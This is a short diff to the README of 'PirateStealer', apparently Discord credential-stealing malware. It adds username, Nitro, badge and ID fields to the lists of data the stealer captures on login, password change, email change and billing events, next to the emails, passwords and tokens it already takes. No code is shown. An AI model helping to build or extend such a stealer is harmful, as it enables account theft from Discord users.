@@ -19,16 +19,33 @@ Official PirateStealer repos
     - City
     - ZIP Code
     - Address
+    - Username
+    - Nitro
+    - Badges
+    - ID
+    - Email
     - Token
 - Discord Login Stealing
+    - Username
+    - Nitro
+    - Badges
+    - ID
     - Email
     - Password
     - Token
 - Discord Change Password
+    - Username
+    - Nitro
+    - Badges
+    - ID
     - Old Password
     - New Password
     - Token
 - Discord Change Email
+    - Username
+    - Nitro
+    - Badges
+    - ID
     - New Email
     - Password
     - Token
